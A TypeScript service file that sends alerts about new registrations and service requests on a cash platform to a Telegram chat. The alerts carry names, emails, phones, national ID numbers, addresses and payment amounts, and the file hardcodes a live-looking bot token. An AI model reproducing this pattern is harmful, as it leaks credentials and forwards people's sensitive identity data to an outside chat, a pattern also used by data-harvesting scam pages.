import { User } from "@shared/schema";

interface TelegramMessage {
  fullName: string;
  email: string;
  phone: string;
  nationalId: string;
  job: string;
  address: string;
  serviceType: string;
  amount: string;
  timestamp: string;
}

export class TelegramService {
  private botToken: string;
  private chatId: string;

  constructor() {
    this.botToken = process.env.TELEGRAM_BOT_TOKEN || "8118081962:AAELBJyLNDzvGVYux_4EGJVuhDv3I2ms3Uk";
    this.chatId = process.env.TELEGRAM_CHAT_ID || "-1001234567890"; // Default chat ID
  }

  async sendNewRegistrationAlert(user: User): Promise<void> {
    const message = `
🆕 تسجيل جديد على منصة فلوس كاش

📛 الاسم: ${user.fullName || `${user.firstName} ${user.lastName}`}
📧 الإيميل: ${user.email}
📱 الموبايل: ${user.phone || 'غير محدد'}
🆔 الرقم القومي: ${user.nationalId || 'غير محدد'}
💼 الوظيفة: ${user.job || 'غير محدد'}
🏠 العنوان: ${user.address || 'غير محدد'}
🕒 الوقت: ${new Date().toLocaleString('ar-EG', { timeZone: 'Africa/Cairo' })}
`;

    await this.sendMessage(message);
  }

  async sendNewServiceAlert(data: TelegramMessage): Promise<void> {
    const message = `
🎯 طلب جديد على منصة فلوس كاش

📛 الاسم: ${data.fullName}
📧 الإيميل: ${data.email}
📱 الموبايل: ${data.phone}
🆔 الرقم القومي: ${data.nationalId}
💼 الوظيفة: ${data.job}
🏠 العنوان: ${data.address}
🕒 الوقت: ${data.timestamp}
📄 الخدمة: ${data.serviceType}
💸 المبلغ: ${data.amount} جنيه
✅ حالة الدفع: تم التحويل على 01026751430
`;

    await this.sendMessage(message);
  }

  private async sendMessage(message: string): Promise<void> {
    try {
      const url = `https://api.telegram.org/bot${this.botToken}/sendMessage`;
      const response = await fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: this.chatId,
          text: message,
          parse_mode: 'HTML',
        }),
      });

      if (!response.ok) {
        console.error('Telegram API error:', await response.text());
      }
    } catch (error) {
      console.error('Failed to send Telegram message:', error);
    }
  }
}

export const telegramService = new TelegramService();